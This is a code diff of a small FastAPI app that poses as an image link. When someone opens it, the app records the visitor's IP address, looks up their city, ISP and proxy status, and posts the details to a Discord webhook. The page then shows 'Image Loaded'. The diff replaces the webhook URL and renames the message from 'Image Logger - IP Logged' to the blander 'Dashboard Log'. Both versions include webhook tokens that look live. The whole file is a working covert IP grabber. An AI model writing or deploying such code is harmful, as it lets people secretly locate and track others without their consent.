@@ -3,28 +3,26 @@ from fastapi.responses import HTMLResponse
 import requests
 
 app = FastAPI()
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1508142381424181479/kAp7Gc6Mobt-RTVXyE9NKgnB9uwRVjOhQbIrjlyAVZ2cztc25vbq3mPRDT1JAE9ufbQi"
 
 @app.get("/")
 async def log_request(request: Request):
-    # This picks the true visitor IP
+    print("--- CONNECTION RECEIVED ---") # This MUST show up in Render Logs
+    
     forwarded = request.headers.get("x-forwarded-for")
     client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
     
     try:
-        # IP Lookup
-        resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query").json()
+        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query"
+        resp = requests.get(url, timeout=5).json()
         
         if resp.get("status") == "success":
-            message = (
-                f"**Image Logger - IP Logged**\n"
-                f"**IP:** `{resp.get('query')}` | **ISP:** `{resp.get('isp')}`\n"
-                f"**Location:** `{resp.get('city')}, {resp.get('regionName')}, {resp.get('country')}`\n"
-                f"**VPN/Proxy:** `{resp.get('proxy')}`"
-            )
-            requests.post(WEBHOOK_URL, json={"content": message})
-    except:
-        pass
+            msg = f"**Dashboard Log**\nIP: {resp.get('query')}\nLocation: {resp.get('city')}, {resp.get('regionName')}\nISP: {resp.get('isp')}\nProxy: {resp.get('proxy')}"
+            requests.post(WEBHOOK_URL, json={"content": msg})
+            print("--- DISCORD SENT ---")
+        else:
+            print("--- API FAILED ---")
+    except Exception as e:
+        print(f"--- ERROR: {e} ---")
 
     return HTMLResponse(content="<h1>Image Loaded</h1>")
